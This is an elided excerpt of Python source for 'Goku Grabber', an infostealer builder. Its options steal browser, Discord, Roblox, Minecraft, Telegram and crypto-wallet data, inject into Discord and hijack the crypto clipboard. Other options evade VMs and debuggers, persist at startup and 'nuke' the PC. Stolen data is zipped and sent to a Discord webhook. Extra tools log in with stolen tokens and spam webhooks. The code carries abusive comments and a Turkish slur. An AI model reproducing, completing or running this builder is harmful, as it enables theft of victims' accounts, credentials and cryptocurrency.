# If you dont like how I code, idgaf, kys - Goku
...
class Builder:
    ...
    def __init__(self,browserR,discordR,robloxR,filesR,minecraftR,networkI,obfuscateS,webhookJ,antiD,rebootP,startupP,errorM,pingH,discordS,exodusS,telegramS,antivmS,hideS,NUKEPCHAHAHA,customMsgDS,customMsgError,compiletoexe,hidepayloadb,PYTHONDHTEXT,DISCORDINJECTION,cryptoCLIPPA,cryptoBITCOIN,cryptoETH,wbh,name,icon):
        ...
        webhook = DiscordWebhook(url=WEB_INTO_THE_HOOK_YEAAAH, username="Goku Grabber", avatar_url=r"https://cdn.discordapp.com/attachments/1082654131833016411/1092464539045466150/Ultra-Instinct-Parfait-Goku.jpg")
        ...
        embed.set_footer(text='Goku 1.0 | by : Goku#0003')
        embed.set_timestamp()
...
def main():
    ...
    content += "\n``|_ END``"
    zipette()
    webhook = DiscordWebhook(url=wbh, username="Goku 1.0", avatar_url=r"https://cdn.discordapp.com/attachments/1082654131833016411/1092464539045466150/Ultra-Instinct-Parfait-Goku.jpg")
    ...
    embed.set_author(name="author : Goku", icon_url=r'https://cdn.discordapp.com/attachments/1082654131833016411/1092464539045466150/Ultra-Instinct-Parfait-Goku.jpg')
    embed.set_footer(text='Goku 1.0 | by : Goku0003')
    embed.set_timestamp()
...
""")
        ...
        messagebox.showinfo("Goku Grabber || Hadi analarını sikekkamına")
        Menu()
...
class Menu:
    ...
    def _NUKEsetup(self):
        if self.NUKEPCHAHAHA:
            ...
            messagebox.showinfo("Goku Grabber 1.0 || Goku#0003","Warning, this option can be very dangerous. We recommend to use this option only on a Virtual Machine device, VPS or an RDP\n\nThis option will ZIP the stub, so you dont missclick and open the stub by accident on your device.")
    ...
    def _testhook(self):
        ...
        if "discord" in wbh:
            ...
            messagebox.showinfo("Goku Grabber || Goku Updated webhook part. Goku now uses sharetext links with your webhook in the paste.\n\n ! Click on the interrogation point (?) and follow the tutorial")
        else:
            try:
                ...
                try:
                    ...
                    embed = DiscordEmbed(title=f"Goku Grabber", description=f"Webhook Working :white_check_mark:", color='4300d1')
                    embed.set_author(name="author : Goku", icon_url=r'https://cdn.discordapp.com/attachments/1082654131833016411/1092464539045466150/Ultra-Instinct-Parfait-Goku.jpg')
                    ...
                    messagebox.showerror("Goku Grabber || @i_might_be_Goku","Invalid Webhook")
            except:
                messagebox.showerror("Goku Grabber || @i_might_be_Goku","Invalid Sharetext Link")
    ...
    def _verification(self):
        ...
        if len(self.webhook.get()) < 5:
            messagebox.showerror("Goku Grabber || @i_might_be_Goku","Link too short idiot")
        else:
            try:
                linky = self.webhook.get()
                if "discord" in linky:
                    self.webhook.delete(0, END)
                    messagebox.showinfo("Goku Grabber || @i_might_be_Goku","Goku Updated webhook part. Goku now uses sharetext links with your webhook in the paste.\n\n ! Click on the interrogation point (?) and follow the tutorial")
                else:
                    try:
                        ...
                        if r.status_code == 200 or r.status_code == 204:
                            ...
                            messagebox.showerror("Goku Grabber || @i_might_be_Goku, Goku#0003","Invalid Webhook")
                    except:
                        messagebox.showerror("Goku Grabber || @i_might_be_Goku, Goku#0003","Invalid Sharetext link")
            except:
                messagebox.showerror("Goku Grabber || @i_might_be_Goku, Goku#0003","Invalid Webhook")
    ...
    def _savehook(self):
        ...
        if self.checkwebhook(self.TOOLWEBHOOK):
            ...
            messagebox.showinfo("Goku Grabber || @i_might_be_Goku, Goku#0003","Webhook was succesfully saved")
        else:
    ...
    def _startgrpfinder(self):
        ...
        messagebox.showinfo("Goku Grabber || @i_might_be_Goku, Goku#0003","Starting to find unowned groups.")
    ...
    def _stealthemclothings(self):
        ...
        if 'errors' in r.json():
            messagebox.showerror("Goku Grabber || @i_might_be_Goku, Goku#0003","Invalid Clothing ID")
    ...
    def usernamegen(self):
        messagebox.showerror("Goku Grabber || @i_might_be_Goku, Goku#0003","Currently Patched. Sad face")
    ...
    def _ENCODE_EL_WEBHOOKA(self):
        ...
        if self.timesencoded == 3:
            messagebox.showerror("Goku Grabber || @i_might_be_Goku, Goku#0003","Max amount of encoding is 3. Wait for new update for better encoding.")
        else:
            ...
            if webhook.startswith('3+'):
                ...
                self.timesencoded += 1
                messagebox.showinfo("Goku Grabber || @i_might_be_Goku, Goku#0003",f"Successfully Encoded Webhook ( Encoded {self.timesencoded} Time(s) )")
            else:
                try:
    ...
    def _copy_el_encoded_webhook(self):
        ...
        self.webhooktoencode.delete(0, END)
        self.timesencoded = 0
        messagebox.showinfo("Goku Grabber || @i_might_be_Goku, Goku#0003",f"Encoded Webhook Copied to Clipboard !")
    ...
    def _spamthehookasf(self):
        ...
        if requests.get(webhooka).status_code == 200 or requests.get(webhooka).status_code == 204:
            ...
            webhook = DiscordWebhook(url=your_webhook, username="Goku Grabber", avatar_url=r"https://cdn.discordapp.com/attachments/1082654131833016411/1092464539045466150/Ultra-Instinct-Parfait-Goku.jpg")
    ...
    def _logintoken(self):
        ...
        if _checktoken(self.discordtoken.get()):
            ...
            messagebox.showerror("Goku Grabber || @i_might_be_Goku, Goku#0003","Error, Invalid or expired token")
    
    def _addstatus(self):
        if len(self.dtcycle.get()) > 1:
            self.STATDATA.append(self.dtcycle.get())
        self.dtcycle.delete(0, END)
        messagebox.showinfo("Goku Grabber || @i_might_be_Goku, Goku#0003",f"Status Added Successfully to the list.")
    ...
    def _addservername(self):
        ...
        messagebox.showinfo("Goku Grabber || @i_might_be_Goku, Goku#0003",f"Server Name Added Successfully to the list.")
    ...
    def _btc(self):
        ...
        messagebox.showinfo("Goku Grabber || @i_might_be_Goku","BTC Address Copied, ty <3")
